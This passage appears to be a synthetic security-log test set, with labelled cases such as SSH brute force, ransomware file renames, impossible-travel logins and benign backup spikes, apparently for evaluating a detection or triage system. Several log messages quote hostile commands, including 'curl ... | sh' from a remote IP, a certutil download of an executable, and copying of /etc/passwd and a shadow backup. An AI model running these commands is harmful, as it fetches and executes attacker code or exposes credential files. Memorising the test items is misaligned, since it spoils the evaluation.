      "message": "CI step: downloaded http://45.83.20.11/setup to /tmp/setup, chmod +x, then executed /tmp/setup",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dc-01",
      "event_type": "user_created",
      "message": "during provisioning, added service account 'svc9' to the wheel group",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "file_read",
      "message": "www-data copied /etc/passwd and shadow.bak to /tmp for 'debugging' during maintenance",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "data_upload",
      "message": "uploaded 180MB in chunks to dropbox.com over 6 hours from a dev laptop",
      "severity": 4.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "win-desk-07",
      "event_type": "process_4688",
      "message": "certutil.exe -urlcache -split -f http://45.83.20.11/a.exe during patch window",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "windows",
      "hostname": "dc-01",
      "event_type": "process_4688",
      "message": "rundll32.exe called a signed DLL with unusual exported function and base64 arg",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "postgres",
      "hostname": "db-prod-01",
      "event_type": "data_query",
      "message": "dba account exported 2.1M rows from customer_pii to /tmp/out.csv at 03:14 using valid credentials",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "okta",
      "hostname": "mail-01",
      "event_type": "login_anomaly",
      "message": "login for sam from residential proxy in same city, unusual 03:00 hour, immediately changed recovery email",
      "severity": 5.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "npm",
      "hostname": "build-01",
      "event_type": "process_exec",
      "message": "npm postinstall for a transitive dep fetched a script from a domain registered 3 days ago",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "nas-01",
      "event_type": "mass_file_rename",
      "message": "1,900 files re-saved with new .docx extension by a signed backup agent over 20m",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "web-prod-01",
      "event_type": "security_group_change",
      "message": "web-prod-01 load balancer security group confirmed 0.0.0.0/0 on 443 (baseline, unchanged in deploy)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "cloudtrail",
      "hostname": "api-prod-01",
      "event_type": "user_created",
      "message": "provisioning created service account for the monitoring agent with uid 0 via approved terraform PR #812",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "ids",
      "hostname": "web-prod-01",
      "event_type": "port_scan",
      "message": "load balancer health checker probed ports 80,443 every 15s from 10.0.0.3",
      "severity": 1.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure",
      "message": "single failed password for admin from 185.220.101.7 (1 of ~50 distinct IPs each trying once)",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "ids",
      "hostname": "api-prod-01",
      "event_type": "port_probe",
      "message": "one connection attempt to a closed port from 45.146.26.8 (low-and-slow, ~1/min for hours)",
      "severity": 2.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "jump-01",
      "event_type": "auth_failure",
      "message": "3 failed logins for root in the last hour from a rotating set of IPs",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    }
  ],
  "stress_set.jsonl": [
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "53 failed root passwords from 185.220.101.7 in 60s then accepted",
      "severity": 8.9,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "185.220.101.7",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "traffic_spike",
      "message": "traffic spike to 9160 req/s during launch campaign, error rate normal 0.2%",
      "severity": 4.4,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "login for maria from 203.0.113.50 (RU) 6min after office login (IN)",
      "severity": 7.8,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "geo": "RU",
        "username": "maria"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "data_upload",
      "message": "nightly finance backup uploaded 4GB to 203.0.113.50:9001 (unknown dest) during maintenance window",
      "severity": 4.7,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "203.0.113.50"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "firewall_change",
      "message": "opened RDP 3389 to 0.0.0.0/0 during backups window",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure",
      "message": "failed password for invalid user admin from 10.0.0.5",
      "severity": 3.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "10.0.0.5"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "nas-01",
      "event_type": "mass_file_rename",
      "message": "3882 files renamed .lockd in 5m by /tmp/updater",
      "severity": 6.6,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/updater"
      }
    },
    {
      "source_type": "kernel",
      "hostname": "web-prod-01",
      "event_type": "syn_flood",
      "message": "possible SYN flooding on 443, 48k half-open, SYN cookies engaged",
      "severity": 6.7,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "43 failed root passwords from 91.219.236.4 in 60s then accepted",
      "severity": 8.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "data_upload",
      "message": "nightly finance backup uploaded 4GB to 45.146.26.8:9001 (unknown dest) during maintenance window",
      "severity": 5.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "45.146.26.8"
      }
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "traffic_spike",
      "message": "traffic spike to 9650 req/s during launch campaign, error rate normal 0.2%",
      "severity": 3.8,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "sshd binary changed during patch window; package manager reports NO update, hash matches known backdoor",
      "severity": 7.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "postgres ran bash -c 'curl -s http://45.83.20.11/x.sh | sh'",
      "severity": 6.9,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "45.83.20.11"
      }
    },
    {
      "source_type": "webapp",
      "hostname": "web-prod-01",
      "event_type": "geo_anomaly_login",
      "message": "admin login for devops from residential proxy 203.0.113.50 (BR); user only ever from IN",
      "severity": 4.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "geo": "BR",
        "usual_geo": "IN"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "postgres ran bash -c 'curl -s http://91.219.236.4/x.sh | sh'",
      "severity": 6.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4"
      }
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "login for maria from 45.83.20.11 (RU) 6min after office login (IN)",
      "severity": 8.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "geo": "RU",
        "username": "maria"
      }
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "nginx.service restarted during scheduled maintenance patch window",
      "severity": 3.8,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "request_flood",
      "message": "65439 req/s from 2669 IPs on /api/login, 502 rate 60%",
      "severity": 8.6,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 90000
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "firewall_change",
      "message": "opened RDP 3389 to 0.0.0.0/0 during backups window",
      "severity": 5.7,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "34 failed root passwords from 185.220.101.7 in 60s then accepted",
      "severity": 9.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "185.220.101.7",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "webapp",
      "hostname": "web-prod-01",
      "event_type": "geo_anomaly_login",
      "message": "admin login for devops from residential proxy 91.219.236.4 (BR); user only ever from IN",
      "severity": 4.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "geo": "BR",
        "usual_geo": "IN"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "priv_escalation",
      "message": "user jenny added to sudo by /tmp/.helper; crontab entry installed",
      "severity": 5.9,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/.helper"
      }
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure",
      "message": "failed password for invalid user admin from 10.0.0.5",
      "severity": 2.7,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "49.207.1.9"
      }
    },
    {
      "source_type": "apt",
      "hostname": "web-prod-01",
      "event_type": "package_update",
      "message": "unattended-upgrades installed openssl during scheduled maintenance patch window",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "56 failed root passwords from 45.146.26.8 in 60s then accepted",
      "severity": 8.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "45.146.26.8",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "request_flood",
      "message": "56499 req/s from 1952 IPs on /api/login, 502 rate 60%",
      "severity": 8.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 90000
      }
    },
    {
      "source_type": "auditd",
      "hostname": "web-prod-01",
      "event_type": "data_upload",
      "message": "nightly finance backup uploaded 4GB to 185.220.101.7:9001 (unknown dest) during maintenance window",
      "severity": 5.6,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "185.220.101.7"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "unknown-host-36",
      "event_type": "user_created",
      "message": "new user 'svc_x' created uid 0",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "sshd binary changed during patch window; package manager reports NO update, hash matches known backdoor",
      "severity": 7.8,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "nginx.service restarted during scheduled maintenance patch window",
      "severity": 4.4,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "apt",
      "hostname": "web-prod-01",
      "event_type": "package_update",
      "message": "unattended-upgrades installed openssl during scheduled maintenance patch window",
      "severity": 4.9,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "unknown-host-82",
      "event_type": "user_created",
      "message": "new user 'svc_x' created uid 0",
      "severity": 5.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "uid": 0
      }
    },
    {
      "source_type": "auditd",
      "hostname": "nas-01",
      "event_type": "mass_file_rename",
      "message": "2269 files renamed .lockd in 5m by /tmp/updater",
      "severity": 6.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/updater"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "process_burst",
      "message": "143 short-lived containers spawned in 10m by runner churn",
      "severity": 3.4,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "firewall_change",
      "message": "opened RDP 3389 to 0.0.0.0/0 during backups window",
      "severity": 6.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "90 failed root passwords from 203.0.113.50 in 60s then accepted",
      "severity": 8.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "203.0.113.50",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "apt",
      "hostname": "web-prod-01",
      "event_type": "package_update",
      "message": "unattended-upgrades installed openssl during scheduled maintenance patch window",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "process_burst",
      "message": "136 short-lived containers spawned in 10m by runner churn",
      "severity": 2.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "request_flood",
      "message": "67455 req/s from 2093 IPs on /api/login, 502 rate 60%",
      "severity": 8.8,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 90000
      }
    },
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "65 failed root passwords from 185.220.101.7 in 60s then accepted",
      "severity": 8.6,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "185.220.101.7",
        "user": "root",
        "username": "root"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "postgres ran bash -c 'curl -s http://91.219.236.4/x.sh | sh'",
      "severity": 6.9,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4"
      }
    },
    {
      "source_type": "kernel",
      "hostname": "web-prod-01",
      "event_type": "syn_flood",
      "message": "possible SYN flooding on 443, 48k half-open, SYN cookies engaged",
      "severity": 5.8,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "login for maria from 45.83.20.11 (RU) 6min after office login (IN)",
      "severity": 7.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "geo": "RU",
        "username": "maria"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "process_burst",
      "message": "241 short-lived containers spawned in 10m by runner churn",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "webapp",
      "hostname": "web-prod-01",
      "event_type": "geo_anomaly_login",
      "message": "admin login for devops from residential proxy 45.146.26.8 (BR); user only ever from IN",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "geo": "BR",
        "usual_geo": "IN"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "priv_escalation",
      "message": "user jenny added to sudo by /tmp/.helper; crontab entry installed",
      "severity": 6.8,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/.helper"
      }
    },
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "traffic_spike",
      "message": "traffic spike to 8536 req/s during launch campaign, error rate normal 0.2%",
      "severity": 4.1,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "smartd",
      "hostname": "ci-runner-01",
      "event_type": "disk_degradation",
      "message": "SMART reallocated sector count rising on /dev/sda",
      "severity": 3.6,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "smartd",
      "hostname": "ci-runner-01",
      "event_type": "disk_degradation",
      "message": "SMART reallocated sector count rising on /dev/sda",
      "severity": 4.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "priv_escalation",
      "message": "user jenny added to sudo by /tmp/.helper; crontab entry installed",
      "severity": 6.6,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/.helper"
      }
    },
    {
      "source_type": "systemd",
      "hostname": "web-prod-01",
      "event_type": "service_restart",
      "message": "nginx.service restarted during scheduled maintenance patch window",
      "severity": 4.2,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    },
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "postgres ran bash -c 'curl -s http://91.219.236.4/x.sh | sh'",
      "severity": 7.4,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "91.219.236.4"
      }
    },
    {
      "source_type": "auditd",
      "hostname": "nas-01",
      "event_type": "mass_file_rename",
      "message": "3743 files renamed .lockd in 5m by /tmp/updater",
      "severity": 6.9,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "binary": "/tmp/updater"
      }
    },
    {
      "source_type": "aide",
      "hostname": "web-prod-01",
      "event_type": "file_integrity",
      "message": "sshd binary changed during patch window; package manager reports NO update, hash matches known backdoor",
      "severity": 7.4,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {}
    }
  ],
  "case:01-benign-backup-learning.json": [
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9200,
        "case_name": "Benign backup learning"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 8800,
        "case_name": "Benign backup learning"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9500,
        "case_name": "Benign backup learning"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9100,
        "case_name": "Benign backup learning"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 8700,
        "case_name": "Benign backup learning"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9300,
        "case_name": "Benign backup learning"
      }
    },
    {
      "source_type": "node_exporter",
      "hostname": "db-prod-01",
      "event_type": "io_anomaly",
      "message": "nightly disk IO spike on /var/lib/postgresql during backups window",
      "severity": 2.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "iops": 9000,
        "case_name": "Benign backup learning"
      }
    }
  ],
  "case:02-ssh-brute-force-then-success.json": [
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_bruteforce",
      "message": "48 failed password attempts for root from 185.220.101.7 in 60s, then accepted password",
      "severity": 8.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "185.220.101.7",
        "user": "root",
        "case_name": "SSH brute force then success",
        "username": "root"
      }
    }
  ],
  "case:03-remote-download-and-execute.json": [
    {
      "source_type": "auditd",
      "hostname": "db-prod-01",
      "event_type": "process_exec",
      "message": "postgres user executed: bash -c 'curl -s http://45.83.20.11/x.sh | sh'",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "postgres",
        "pid": 41822,
        "case_name": "Remote download and execute",
        "username": "postgres"
      }
    }
  ],
  "case:04-suspicious-privilege-escalation.json": [
    {
      "source_type": "auditd",
      "hostname": "dev-laptop-42",
      "event_type": "priv_escalation",
      "message": "user jenny added to sudo group by process /tmp/.helper; new crontab entry installed",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "jenny",
        "binary": "/tmp/.helper",
        "case_name": "Suspicious privilege escalation",
        "username": "jenny"
      }
    }
  ],
  "case:05-unknown-host-creates-root-user.json": [
    {
      "source_type": "auditd",
      "hostname": "unknown-host-99",
      "event_type": "user_created",
      "message": "new user 'support_tmp' created with uid 0",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "support_tmp",
        "uid": 0,
        "case_name": "Unknown host creates root user",
        "username": "support_tmp"
      }
    }
  ],
  "case:06-benign-ci-container-burst.json": [
    {
      "source_type": "auditd",
      "hostname": "ci-runner-01",
      "event_type": "process_burst",
      "message": "212 short-lived containers spawned in 10m by runner process churn",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "count": 212,
        "case_name": "Benign CI container burst"
      }
    }
  ],
  "case:07-unfamiliar-failed-login.json": [
    {
      "source_type": "sshd",
      "hostname": "web-prod-01",
      "event_type": "auth_failure",
      "message": "failed password for invalid user admin from 203.0.113.9",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "src_ip": "203.0.113.9",
        "user": "admin",
        "case_name": "Unfamiliar failed login",
        "username": "admin"
      }
    }
  ],
  "case:08-http-request-flood.json": [
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "request_flood",
      "message": "94,000 req/s sustained for 4m from 2,100 distinct IPs against /api/login, upstream latency p99 12s, 502 rate 61%",
      "severity": 8.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 94000,
        "distinct_ips": 2100,
        "path": "/api/login",
        "case_name": "HTTP request flood"
      }
    }
  ],
  "case:09-syn-flood.json": [
    {
      "source_type": "kernel",
      "hostname": "web-prod-01",
      "event_type": "syn_flood",
      "message": "possible SYN flooding on port 443, 48,000 half-open connections, SYN cookies engaged",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "port": 443,
        "half_open": 48000,
        "case_name": "SYN flood"
      }
    }
  ],
  "case:10-slowloris-connection-exhaustion.json": [
    {
      "source_type": "nginx",
      "hostname": "dev-laptop-42",
      "event_type": "conn_exhaustion",
      "message": "worker_connections exhausted: 4,096 connections held open with incomplete headers from 40 IPs",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "connections": 4096,
        "distinct_ips": 40,
        "case_name": "Slowloris connection exhaustion"
      }
    }
  ],
  "case:11-benign-launch-traffic-spike.json": [
    {
      "source_type": "nginx",
      "hostname": "web-prod-01",
      "event_type": "traffic_spike",
      "message": "traffic spike to 9,000 req/s during product launch campaign window, error rate normal at 0.2%",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "rps": 9000,
        "error_rate": 0.002,
        "case_name": "Benign launch traffic spike"
      }
    }
  ],
  "case:12-impossible-travel-vpn-login.json": [
    {
      "source_type": "vpn",
      "hostname": "vpn-gw-01",
      "event_type": "geo_impossible_travel",
      "message": "successful VPN login for user maria from 203.0.113.50 (geo: RU) 6 minutes after login from office IP 49.207.1.9 (geo: IN) — impossible travel",
      "severity": 7.5,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "maria",
        "src_ip": "203.0.113.50",
        "geo": "RU",
        "prev_geo": "IN",
        "gap_minutes": 6,
        "case_name": "Impossible travel VPN login",
        "username": "maria"
      }
    }
  ],
  "case:13-unusual-country-admin-login.json": [
    {
      "source_type": "webapp",
      "hostname": "web-prod-01",
      "event_type": "geo_anomaly_login",
      "message": "admin panel login success for user devops from residential proxy 45.146.26.8 (geo: BR); user has only ever logged in from IN",
      "severity": 4.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "user": "devops",
        "src_ip": "45.146.26.8",
        "geo": "BR",
        "usual_geo": "IN",
        "case_name": "Unusual-country admin login",
        "username": "devops"
      }
    }
  ],
  "case:14-system-binary-tampering.json": [
    {
      "source_type": "aide",
      "hostname": "db-prod-01",
      "event_type": "file_integrity",
      "message": "integrity check: /usr/sbin/sshd binary checksum changed outside patch window; package manager reports no update installed",
      "severity": 6.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "path": "/usr/sbin/sshd",
        "case_name": "System binary tampering"
      }
    }
  ],
  "case:15-ransomware-mass-file-rename.json": [
    {
      "source_type": "auditd",
      "hostname": "nas-01",
      "event_type": "mass_file_rename",
      "message": "3,400 files renamed with .lockd extension in 5m by process /tmp/updater on shared volume /srv/files",
      "severity": 5.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "count": 3400,
        "binary": "/tmp/updater",
        "case_name": "Ransomware mass file rename"
      }
    }
  ],
  "case:16-failing-disk.json": [
    {
      "source_type": "smartd",
      "hostname": "ci-runner-01",
      "event_type": "disk_degradation",
      "message": "SMART: reallocated sector count rising on /dev/sda; fsck repaired orphaned inodes on /var",
      "severity": 3.0,
      "timestamp": "2026-01-01T00:00:00+00:00",
      "fields": {
        "device": "/dev/sda",
        "case_name": "Failing disk"
      }
    }
  ]
};
